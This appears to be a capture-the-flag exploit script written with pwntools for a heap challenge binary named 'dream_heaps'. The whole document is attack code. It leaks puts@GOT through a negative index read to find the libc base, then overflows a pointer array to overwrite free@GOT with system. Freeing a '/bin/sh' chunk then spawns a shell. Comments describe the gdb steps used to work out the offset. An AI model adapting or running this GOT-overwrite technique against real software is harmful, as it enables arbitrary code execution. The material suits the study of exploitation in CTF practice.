from pwn import * 

p = process(['./dream_heaps'])

elf = ELF('./dream_heaps',checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)

context.log_level = 'debug'

puts_got_pointer = 0x400538

# elf
puts_got = elf.got['puts']
free_got = elf.got['free']

# libc
libc_puts = libc.symbols['puts']

def write(content,len):
    p.sendlineafter(b"> ",b"1")
    p.sendlineafter(b"dream?\n",str(len))
    p.sendlineafter(b"dream?\n",content)

def read(idx):
    p.sendlineafter(b"> ",b"2")
    p.sendlineafter(b"read?\n",str(idx))
    leak = u64(p.recvuntil(b'What',drop=True).ljust(8,b'\x00'))
    return leak

def edit(idx,content):
    p.sendlineafter(b"> ",b"3")
    p.sendlineafter(b"change?\n",str(idx))
    p.send(content)

def delete(idx):
    p.sendlineafter(b'> ',b'4')
    p.sendlineafter(b'delete?\n',str(idx))

## -263021 come from range between HEAP_PTRS to address that point to puts@got. since the HEAP_PTRS point to address on that array
## we can get the address using these step
## br main
## search-pattern 0x00602020
## 0x400538 - 0x40053b  â†’   "  `" 
## p/d (0x6020a0 - 0x400538) / 8
## $19 = 263021
## since the address of HEAP_PTRS higher than the address we achieved, so make it negative

leaks = read(-263021)

libc.address = leaks - libc_puts
libc_system = libc.symbols['system']

log.success("Leak puts: " + hex(leaks))
log.success("Libc base: " + hex(libc.address))

# Setup array HEAP_PTS and SIZE
write('/bin/sh\x00',8)

for i in range(16): # overflow array until reach the address that we can control. both size and where to write are in our control
    write('A'*8,8)

write('A'*8,16) # size write to free_got 
write('A'*8,free_got) 

# gdb.attach(p,gdbscript="""init-gef
# br *0x00000000004009eb
# x/50gx 0x6020a0""")

edit(17,p64(libc_system)) # index 17 = 18 in memory cause index start from 0
delete(0)

p.interactive()